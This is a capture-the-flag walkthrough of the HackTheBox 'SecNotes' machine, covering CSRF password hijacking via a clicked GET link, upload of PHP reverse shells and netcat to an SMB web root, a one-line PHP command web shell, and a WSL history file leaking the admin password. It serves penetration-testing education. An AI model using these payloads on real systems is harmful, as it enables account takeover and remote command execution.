---
title: "HackTheBox - SecNotes"
author: Nasrallah
description: ""
date: 2023-03-21 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, csrf, wsl, smb]
img_path: /assets/img/hackthebox/machines/secnotes
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [SecNotes](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
PORT     STATE SERVICE      VERSION                                                                                                                           
80/tcp   open  http         Microsoft IIS httpd 10.0                                                                                                          
| http-methods:                                                                                                                                               
|_  Potentially risky methods: TRACE                                                                                                                          
|_http-server-header: Microsoft-IIS/10.0                                                                                                                      
| http-title: Secure Notes - Login                                                                                                                            
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-17T09:21:37
|_  start_date: N/A
|_clock-skew: mean: 2h20m01s, deviation: 4h02m32s, median: 0s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00 
|   Workgroup: HTB\x00
|_  System time: 2023-03-17T02:21:38-07:00
```

We found 3 open ports, 80 and 8808 are IIS http web server and 455 is SMB.

## Web

Let's navigate to the web page on port 8808.

![](11.png)

It's the default page for IIS and nothing really useful can be found.

Let's go to port 80

![](1.png)

We found a login page, the first things usually tried when facing a login form is sql injection and default credentials but none of that worked.

Let's go to the register page.

![](2.png)

After registering a user, let's log in.

![](3.png)

Once logged in, we see a message from `tyler` saying that we can contact him on the contact page.

We also see that we can create notes, change passwords and sign out.

Testing the note functionality we find it's a vulnerable to XSS.

![](4.png)

I also make a cookie stealer but didn't get anything.

Let's move to the change password functionality.

![](5.png)

To change to password, we send a POST request with the following parameters.

```text
password=pass123&confirm_password=pass123&submit=submit
```

Let's test if we can change the password using a get request using the following url.

```url
http://10.10.10.97/change_pass.php?password=pass321&confirm_password=pass321&submit=submit
```

![](6.png)

We managed to change the password with the get request.

Now let's go the contact page.

I setup a web server on my local machine and sent a link of my address to tyler in the contact page.

![](7.png)

The link got clicked


# **Foothold**

Knowing that we can change password using a GET request, and that `tyler` do click links we send him, let's send him the GET request for password change and see if it works.

```bash
http://10.10.10.97/change_pass.php?password=pass321&confirm_password=pass321&submit=submit
http://10.10.17.90/password_changed_successfuly
```

The second url is used to tell me if the links has been clicked.

![](8.png)

After getting a hit our web server, we go to the login page and login as tyler with the new password.

![](9.png)

On one of the notes we see tyler's password for the share `new-site`.

Let's list the smb share as user `tyler` using the password.

```terminal
$ sudo smbclient -L 10.10.10.97 -U tyler                                                                                                           130 ⨯
Enter WORKGROUP\tyler's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        new-site        Disk      
SMB1 disabled -- no workgroup available
```

Let's connect to the `new-site` share.

![](10.png)

We found and html file and a png image, those are the default file for the IIS web server so this share must be the root for the website on port 8808.

Let's test this theory by uploading a file to the share and see if we can request it.

![](12.png)

It worked.

To get a reverse shell, we can upload a php reverse shell.

![](13.png)

We got a shell bu there is a script delete file in the share causing our shell to die.

To solve that we upload a copy of netcat and the php shell to the share, once we get a shell, we use netcat to get another shell.

The problem is we got a shell as `newsite`, to get a shell as tyler i uploaded the following php web shell.

```bash
<?php SYSTEM($_REQUEST["cmd"]);?>
```

Then used it to execute netcat for a shell.

![](14.png)

![](15.png)


# **Privilege Escalation**

On `tyler`'s desktop we find the following.

![](16.png)

There is a shortcut to `bash` which means there is a WSL(Windows Subsystem for Linux), let's locate `bash.exe` using the following command.

```bash
where /R /c:\ bash.exe
```

![](17.png)

We found bash at `c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe`, we run it and got a shell as root.

Checking the root directory, we see that the history file is not empty.

![](18.png)

On the history file we managed to get the administrator's password.

We can use that password to get a shell using `psexec`.

![](19.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).